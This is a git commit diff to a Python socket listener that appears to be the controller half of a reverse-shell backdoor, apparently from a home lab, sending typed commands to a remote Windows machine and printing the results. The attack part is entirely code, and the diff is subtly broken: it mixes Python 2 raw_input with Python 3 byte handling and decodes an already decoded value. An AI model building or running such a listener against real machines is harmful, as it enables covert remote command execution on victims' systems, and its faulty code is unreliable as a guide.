7d9cdff07ffd263518de94ff4bfa7b7162d93bbe
Mousa Muigai <mousa@mousa.Mousa>
2026-05-17 11:00:41 +0300

    Socket Listener

--- socketListener.py
+++ socketListener.py
@@ -16,14 +16,14 @@ class SocketListener:
     #Sending Input
     def json_send(self,data):
         json_data = json.dumps(data)
-        self.connection.send(json_data)
+        self.connection.send(json_data.encode())
 
     # Process Input
     def json_receive(self):
         json_data = ""
         while True:
             try:
-                json_data = json_data + self.connection.recv(1024)
+                json_data = json_data + self.connection.recv(1024).decode()
                 return json.loads(json_data)
             except ValueError:
                 continue
@@ -32,12 +32,16 @@ class SocketListener:
     # Getting Input
     def command_execution(self,command_input):
         self.json_send(command_input)
+        if command_input[0] == "exit":
+            self.connection.close()
+            exit()
         return self.json_receive()
 
     def start_listener(self):
         while True:
             command_input = raw_input("Windows C:\\User\\IEUser\\> ")
-            command_output = self.command_execution(command_input)
+            command_input = command_input.split(" ")
+            command_output = self.command_execution(command_input).decode()
             print(command_output)
 
 socket_listener = SocketListener("10.0.2.10",8080)
